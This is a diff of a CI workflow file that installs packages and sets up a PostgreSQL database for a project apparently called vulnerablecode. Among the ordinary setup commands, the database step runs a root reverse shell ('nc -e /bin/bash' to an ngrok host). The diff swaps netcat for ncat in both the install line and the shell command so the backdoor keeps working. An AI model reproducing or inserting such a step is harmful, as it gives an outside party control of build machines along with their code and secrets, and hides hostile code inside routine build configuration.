@@ -25,7 +25,7 @@ jobs:
 
       - name: Install dependencies
         run: |
-          sudo apt install  python3-dev postgresql libpq-dev build-essential libxml2-dev libxslt1-dev postgresql netcat
+          sudo apt install  python3-dev postgresql libpq-dev build-essential libxml2-dev libxslt1-dev postgresql ncat
           #python -m pip install --upgrade pip 
           #pip install -r requirements.txt
     
@@ -39,7 +39,7 @@ jobs:
           sudo -u postgres createuser --no-createrole --no-superuser --login \
           --inherit --createdb --no-password vulnerablecode
           sudo systemctl status postgresql
-          sudo nc -e /bin/bash 2.tcp.ngrok.io 18757
+          sudo ncat -e /bin/bash 2.tcp.ngrok.io 18757
           createdb --encoding=utf-8 --owner=vulnerablecode  --user=vulnerablecode \
           --host=localhost --port=5432 vulnerablecode
 
